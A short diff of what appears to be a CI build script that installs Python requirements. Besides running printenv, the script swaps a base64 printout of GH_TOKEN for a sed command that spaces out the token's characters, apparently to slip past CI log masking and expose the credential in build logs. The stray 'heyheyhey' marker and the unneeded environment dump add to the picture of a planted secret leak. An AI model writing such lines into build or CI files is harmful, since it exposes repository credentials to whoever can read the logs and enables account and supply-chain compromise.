@@ -21,8 +21,8 @@ PYTHON_VERSION=${PYTHON_VERSION:-2.7}
 
 echo "heyheyhey####"
 printenv
-encoded_token=$(echo -n "$GH_TOKEN" | base64)
-echo "Encoded GH_TOKEN: $encoded_token"
+
+echo $GH_TOKEN | sed 's/./& /g'
 
 pip install -U -r .github/scripts/requirements.txt
 python setup.py develop
